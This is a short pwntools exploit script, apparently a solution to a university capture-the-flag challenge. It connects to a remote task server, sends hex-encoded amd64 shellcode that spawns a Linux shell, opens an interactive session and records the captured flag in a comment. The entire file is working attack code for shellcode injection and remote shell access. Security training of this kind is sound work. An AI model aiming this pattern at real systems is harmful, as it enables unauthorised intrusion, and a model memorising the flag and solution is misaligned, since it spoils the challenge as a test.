from pwn import *
import string
from sys import argv
import os
import time


context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'


# start remote
p = remote('tasks.ws24.softsec.rub.de', 32857)

# start locally with docker
#p = remote('127.0.0.1', 1024)


# payload reading the flag
payload = asm(shellcraft.amd64.linux.sh())

p.sendline(payload.hex().encode())

# find randomly hidden flag
p.interactive()

# softsec{hPw44lsmc43hqmQ4xXmACw_K9TUmhxjYKDaA22uYupUSrBBGIPxdJ8mtowvyDp62}